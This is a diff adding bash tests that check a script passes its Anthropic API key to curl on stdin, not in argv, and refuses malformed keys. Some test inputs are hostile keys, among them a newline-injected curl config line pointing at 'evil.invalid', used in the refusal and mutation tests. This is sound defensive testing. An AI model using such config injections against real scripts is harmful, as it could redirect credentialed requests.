@@ -24,6 +24,18 @@
 # Issue: #2720.
 
 set -euo pipefail
+# Canonical fixture-dir guard (BYTE-IDENTICAL to plugins/soleur/test/test-helpers.sh; fixture-dir-operand-assert.test.sh compares every copy).
+assert_fixture_dir() {
+  case "${1-}" in
+    "") printf 'FATAL: fixture dir is EMPTY; git -C "" would operate on %s\n' "$PWD" >&2; exit 2 ;;
+    */../*|*/..) printf 'FATAL: fixture dir %s contains ..; refusing\n' "$1" >&2; exit 2 ;;
+    /proc/*|/sys/*|/dev/*) printf 'FATAL: fixture dir %s is a synthetic-fs path; refusing\n' "$1" >&2; exit 2 ;;
+    /|//|/.) printf 'FATAL: fixture dir resolves to the filesystem root; refusing\n' >&2; exit 2 ;;
+    /*) : ;;
+    *)  printf 'FATAL: fixture dir %s is RELATIVE; refusing\n' "$1" >&2; exit 2 ;;
+  esac
+}
+
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 SUT="$SCRIPT_DIR/compound-promote.sh"
@@ -177,6 +189,18 @@ make_mock_curl() {
 #!/usr/bin/env bash
 # Capture the request payload for assertions.
 CAPTURE="$capture"
+# Record EVERY argument (NUL-separated, so a newline inside -d cannot forge an argument
+# boundary) and, when the call asks for a config on stdin (--config - / -K -), the stdin
+# bytes. These two sidecars are how the key-off-argv rows prove WHERE the credential went:
+# a mock that only saw -d could not tell an argv header from a stdin one (D7).
+printf '%s\0' "\$@" > "\$CAPTURE.argv"
+_prev=""
+for _a in "\$@"; do
+  if [[ ( "\$_prev" == "--config" || "\$_prev" == "-K" ) && "\$_a" == "-" ]]; then
+    cat > "\$CAPTURE.stdin"
+  fi
+  _prev="\$_a"
+done
 # Walk args, find -d <payload> or --data <payload>, write payload to capture.
 while [[ \$# -gt 0 ]]; do
   case "\$1" in
@@ -488,6 +512,199 @@ t8_shell_jq_readers_are_identical_and_type_selecting() {
                    "t8-payload" "$extracted"
 }
 
+# --- T9 (argv-bearer sweep S2, D7): the API key rides stdin, never argv ---------
+# The request used to carry `-H "x-api-key: $ANTHROPIC_API_KEY"` as an ARGUMENT of the curl
+# process, readable by every local user in /proc/<pid>/cmdline. It now goes on a stdin
+# config (`--config -`, fed by a process substitution). The mock records argv and stdin, so
+# the row can say where the key went, not just that the call succeeded. The key is a
+# synthetic canary; verdicts are found|absent so a failure never has to print it.
+cp_has() { if [[ "$1" == *"$2"* ]]; then echo found; else echo absent; fi; }
+
+make_enabled_root() { # -> a root with the safe fixtures and promotion enabled
+  local root; root=$(make_temp_root)
+  copy_fixtures "$root"
+  cat > "$root/knowledge-base/project/promotion-config.yml" <<'EOF'
+enabled: true
+EOF
+  printf '%s' "$root"
+}
+
+t9_api_key_travels_on_stdin_not_argv() {
+  local root; root=$(make_enabled_root)
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
+  local canary="CANARY-t9-$$-$RANDOM"
+
+  local out exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY="$canary" bash "$SUT" 2>&1) || exit_code=$?
+
+  assert_eq "T9 exit code is 0" "0" "$exit_code"
+  # Precondition: without a recorded call every "absent" below is vacuous.
+  assert_eq "T9 precondition: the mock recorded the call's argv" "true" \
+            "$([[ -s "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+  local argv stdin_cfg first_arg
+  argv=$(tr '\0' '\n' < "$root/curl-capture.txt.argv")
+  stdin_cfg=""; [[ -f "$root/curl-capture.txt.stdin" ]] && stdin_cfg=$(cat "$root/curl-capture.txt.stdin")
+  first_arg=$(head -n 1 <<<"$argv")
+  assert_eq "T9 --disable is the FIRST curl argument (it aborts ~/.curlrc parsing)" "--disable" "$first_arg"
+  assert_contains "T9 --noproxy is present" "--noproxy" "$argv"
+  # The EXACT transport flags, in order: a value mutant (`--noproxy example.invalid`) keeps the word
+  # `--noproxy` and re-enables ALL_PROXY/HTTPS_PROXY for the credentialed request.
+  assert_eq "T9 --noproxy is the SECOND curl argument" "--noproxy" "$(sed -n 2p <<<"$argv")"
+  assert_eq "T9 --noproxy's value is exactly '*' (every host bypasses any proxy)" "*" "$(sed -n 3p <<<"$argv")"
+  assert_eq "T9 the silent-but-show-errors flags follow as -sS" "-sS" "$(sed -n 4p <<<"$argv")"
+  # The WHOLE recorded argv, not a prefix (the same exactness check-deploy-script-parity.test.sh C15b
+  # applies): a prefix pin stays green when `-k` (TLS verification off), `-L` (follow redirects with the
+  # credential) or `http://` (the key in cleartext) is added after the first four tokens. Only the -d body
+  # (non-secret corpus text, captured separately above) is masked; the endpoint is a LITERAL so a scheme
+  # or host change is caught. Read NUL-delimited, so a newline inside a token cannot forge a boundary.
+  local tok exact_argv="" masked_next=0
+  while IFS= read -r -d '' tok; do
+    if (( masked_next )); then tok="<-d body>"; masked_next=0
+    elif [[ "$tok" == "-d" ]]; then masked_next=1; fi
+    exact_argv+="$tok"$'\x1f'
+  done < "$root/curl-capture.txt.argv"
+  local us=$'\x1f' want_argv
+  want_argv="--disable${us}--noproxy${us}*${us}-sS${us}https://api.anthropic.com/v1/messages${us}-H${us}anthropic-version: 2023-06-01${us}-H${us}content-type: application/json${us}-d${us}<-d body>${us}--config${us}-${us}"
+  # Verdict only (exact|drift): a drifted argv could be one that carries the key, which must not be printed.
+  assert_eq "T9 the recorded curl argv is EXACTLY the pinned transport set (no -k / -L / http:// can be added; only the -d body is masked)" \
+            "exact" "$([[ "$exact_argv" == "$want_argv" ]] && echo exact || echo drift)"
+  assert_contains "T9 the credential config is read from stdin" "--config" "$argv"
+  assert_eq "T9 no x-api-key header is an argument" "absent" "$(cp_has "$argv" "x-api-key")"
+  assert_eq "T9 the key bytes are in no argument" "absent" "$(cp_has "$argv" "$canary")"
+  assert_eq "T9 the key is delivered as the stdin config header" "header = \"x-api-key: $canary\"" "$stdin_cfg"
+  assert_eq "T9 the key never reaches the script's own output" "absent" "$(cp_has "$out" "$canary")"
+  # The non-secret headers and the body stay arguments, and the payload capture still works.
+  assert_contains "T9 anthropic-version stays an argument" "anthropic-version: 2023-06-01" "$argv"
+  assert_contains "T9 the request payload is still captured from -d" "messages" "$(cat "$root/curl-capture.txt" 2>/dev/null)"
+}
+
+# --- T10: a key outside the shape class is refused BEFORE any call --------------
+# The stdin config is a line-oriented grammar: a quote or newline inside the key would end
+# the header value and let the rest be read as further config directives. The guard sits
+# before the call, and the refusal is a marker plus exit 1 (this script has one failure
+# class and its workflow step goes red on it), never an empty-content error after a 401.
+t10_malformed_key_is_refused_before_any_call() {
+  local marker_base="SOLEUR_CREDENTIAL_REFUSED script=compound-promote reason="
+  local -a keys=('has space' 'quo"te' 'back\slash' 'semi;colon' 'dollar$x' "sq'uote"
+                 $'tab\tkey' $'new\nzzline77' $'inj\nurl = "http://evil.invalid"' $'ctl\001key' $'del\177key')
+  local -a want=(token_shape token_shape token_shape token_shape token_shape token_shape
+                 control_char control_char control_char control_char control_char)
+  local i root out exit_code n_ran=0 first_line
+  for i in "${!keys[@]}"; do
+    root=$(make_enabled_root)
+    local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+    local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
+    exit_code=0
+    out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+          ANTHROPIC_API_KEY="${keys[$i]}" bash "$SUT" 2>&1) || exit_code=$?
+    assert_eq "T10 [$i] exit code is 1" "1" "$exit_code"
+    assert_eq "T10 [$i] the mock curl was never called" "false" \
+              "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+    assert_eq "T10 [$i] exactly one marker with reason ${want[$i]}" "1" \
+              "$(grep -cxF -- "${marker_base}${want[$i]}" <<<"$out" || true)"
+    # The key (or its dangerous tail) is never echoed.
+    first_line="${keys[$i]%%$'\n'*}"
+    if [[ "${keys[$i]}" == *$'\n'* ]]; then
+      assert_eq "T10 [$i] the key's second line is not echoed" "absent" "$(cp_has "$out" "${keys[$i]#*$'\n'}")"
+    else
+      assert_eq "T10 [$i] the key is not echoed" "absent" "$(cp_has "$out" "$first_line")"
+    fi
+    n_ran=$((n_ran + 1))
+  done
+  # A row floor cannot see a loop that runs zero times; this counter can.
+  assert_eq "T10 inner counter: every hostile key ran" "${#keys[@]}" "$n_ran"
+  assert_eq "T10 inner counter: every key has an expected reason" "${#keys[@]}" "${#want[@]}"
+
+  # An EMPTY key keeps its pre-existing refusal (not the marker) and also makes no call.
+  root=$(make_enabled_root)
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
+  exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY="" bash "$SUT" 2>&1) || exit_code=$?
+  assert_eq "T10 empty key: exit code is 1" "1" "$exit_code"
+  assert_contains "T10 empty key: keeps the not-set error" "ANTHROPIC_API_KEY not set" "$out"
+  assert_eq "T10 empty key: the mock curl was never called" "false" \
+            "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+
+  # MUST-PASS, not the canonical: a realistic key shape (underscores, dots, tildes, plus, slash,
+  # equals) goes through. A guard that refused everything would satisfy every row above.
+  root=$(make_enabled_root)
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
+  local real_shape='sk-ant-api03-Ab_Cd.Ef~Gh+Ij/Kl=-0123456789'
+  exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY="$real_shape" bash "$SUT" 2>&1) || exit_code=$?
+  assert_eq "T10 must-pass: a realistic key shape is accepted (exit 0)" "0" "$exit_code"
+  assert_eq "T10 must-pass: it is delivered on stdin intact" "header = \"x-api-key: $real_shape\"" \
+            "$(cat "$root/curl-capture.txt.stdin" 2>/dev/null)"
+}
+
+# --- T11: mutation. Remove the guard call -> the same hostile key reaches curl -----
+# Proves T10's "never called" rows discriminate: without the guard the stdin config would
+# carry an injected directive. The mutant needs the real lib/ beside it (the SUT sources
+# its strip.sh from its own directory).
+t11_guard_removal_is_caught() {
+  local root; root=$(make_enabled_root)
+  local mutdir="$root/mut"; mkdir -p "$mutdir"
+  ln -s "$(dirname "$SUT")/lib" "$mutdir/lib"
+  sed '/^_cp_refuse_malformed_api_key$/d' "$SUT" > "$mutdir/compound-promote.sh"
+  local n_calls_real n_calls_mut
+  n_calls_real=$(grep -cx '_cp_refuse_malformed_api_key' "$SUT" || true)
+  n_calls_mut=$(grep -cx '_cp_refuse_malformed_api_key' "$mutdir/compound-promote.sh" || true)
+  if [[ "$n_calls_real" != "1" || "$n_calls_mut" != "0" ]]; then
+    TOTAL=$((TOTAL + 1)); FAIL=$((FAIL + 1))
+    echo "FAIL: T11 mutation did not land (real calls=$n_calls_real mutant calls=$n_calls_mut) -- the row would be vacuous"
+    return
+  fi
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
+  local out exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY=$'inj\nurl = "http://evil.invalid"' bash "$mutdir/compound-promote.sh" 2>&1) || exit_code=$?
+  assert_eq "T11 with the guard call removed, the hostile key REACHES curl" "true" \
+            "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+  assert_contains "T11 and the injected directive is on the stdin config" 'url = "http://evil.invalid"' \
+            "$(cat "$root/curl-capture.txt.stdin" 2>/dev/null)"
+}
+
+# --- T12: the stdin config is fed by a process substitution, NEVER `printf | curl` ---------
+# Under `set -o pipefail` a curl that exits without reading its stdin can make the printf producer
+# die on SIGPIPE, and the pipeline then reports 141 and `set -e` ends the run. The mock below never
+# reads stdin and the key is longer than a pipe buffer (so the producer is still writing when the
+# consumer is gone): the process-substitution form shrugs that off (exit 0, clusters emitted); the
+# pipe form exits 141. T9 cannot see this: its mock reads stdin to the end.
+make_mock_curl_noread() { # <path> <capture>: records argv, never reads stdin, answers an empty clusters array
+  local path="$1" capture="$2"
+  assert_fixture_dir "$path"
+  cat > "$path" <<EOF
+#!/usr/bin/env bash
+printf '%s\0' "\$@" > "$capture.argv"
+printf '%s' '{"content":[{"type":"text","text":"[]"}]}'
+EOF
+  chmod +x "$path"
+}
+
+t12_stdin_config_is_not_a_pipe_into_curl() {
+  local root; root=$(make_enabled_root)
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl_noread "$curl_bin" "$root/curl-capture.txt"
+  # 120000 token-class bytes: above the 64 KiB default pipe buffer, below the 128 KiB single-env-string cap.
+  local bigkey; bigkey=$(head -c 120000 /dev/zero | tr '\0' 'A')
+  assert_eq "T12 precondition: the key outgrows a pipe buffer (65536 bytes), else the producer never blocks" \
+            "1" "$(( ${#bigkey} > 65536 ))"
+  local out exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY="$bigkey" bash "$SUT" 2>&1) || exit_code=$?
+  assert_eq "T12 a curl that never reads its stdin does not fail the run (a pipe form exits 141)" "0" "$exit_code"
+  assert_eq "T12 the never-reading mock curl WAS called" "true" \
+            "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+  assert_contains "T12 the run reached the clusters sentinel" "::compound-promote-clusters-json::" "$out"
+}
+
 t1_no_config_returns_noop
 t2_disabled_config_returns_noop
 t3_gdpr_pre_pass_excludes_pii_files
@@ -496,6 +713,10 @@ t5_week_cap_reached_short_circuits
 t6_byte_budget_sentinel_emitted
 t7_thinking_first_response_parses
 t8_shell_jq_readers_are_identical_and_type_selecting
+t9_api_key_travels_on_stdin_not_argv
+t10_malformed_key_is_refused_before_any_call
+t11_guard_removal_is_caught
+t12_stdin_config_is_not_a_pipe_into_curl
 
 echo
 echo "PASS=$PASS FAIL=$FAIL TOTAL=$TOTAL"
@@ -509,7 +730,7 @@ echo "PASS=$PASS FAIL=$FAIL TOTAL=$TOTAL"
 # by slicing the floor block plus the CONTIGUOUS simple assignments above it, so a
 # threshold declared further up leaves the mutant unbound under `set -u` and the floor
 # scores as a construction failure instead of as a firing floor.
-MIN_ASSERTIONS=28
+MIN_ASSERTIONS=100
 if [[ "$TOTAL" -lt "$MIN_ASSERTIONS" ]]; then
   printf 'FATAL: assertion floor breached (TOTAL=%s < %s) — cases did not dispatch\n' \
     "$TOTAL" "$MIN_ASSERTIONS" >&2
